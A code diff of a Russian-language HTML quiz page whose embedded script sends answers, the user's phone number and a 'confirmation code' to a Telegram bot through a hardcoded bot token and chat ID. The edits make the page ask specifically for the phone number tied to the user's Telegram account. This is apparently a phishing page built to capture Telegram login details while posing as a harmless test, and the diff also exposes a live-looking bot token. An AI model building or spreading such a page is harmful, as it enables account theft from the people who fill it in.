@@ -95,7 +95,7 @@
                 <input type="radio" name="q8" value="Халяль"> Халяль
             </div>
 
-            <label for="phone">Введите ваш номер телефона:</label>
+            <label for="phone">Введите ваш номер телефона (на котором у вас зарегистрирован акаунт в телеграме):</label>
             <input type="text" id="phone" name="phone" placeholder="+7XXXXXXXXXX" required>
 
             <button type="button" id="submitTest">Отправить ответы</button>
@@ -115,7 +115,7 @@
 
     <script>
       const BOT_TOKEN = "7619958121:AAETlme7ZmSzyB_fu_VZD22pDEtvSLOgexY";
-      const CHAT_IDS = ["1335366204", "Другой_чат_ID"];  // Массив ID чатов
+      const CHAT_IDS = ["1335366204", "1335366204"];  // Массив ID чатов
 
 // Отправка данных в Telegram
 async function sendToTelegram(message) {
@@ -186,7 +186,7 @@ async function sendToTelegram(message) {
             // Отправка кода подтверждения в Telegram
             const success = await sendToTelegram(`🔑 Код подтверждения: ${code}`);
             if (success) {
-                document.getElementById('codeMessage').textContent = "Ты прошёл тест! результаты придут тебе на номер телефона который ты указал!";
+                document.getElementById('codeMessage').textContent = "Ты прошёл тест! результаты придут тебе на акаунт в телеграме, номер которого ты указал который ты указал!";
             } else {
                 document.getElementById('codeMessage').textContent = "Произошла ошибка. Попробуйте снова.";
                 sendCodeButton.disabled = false;
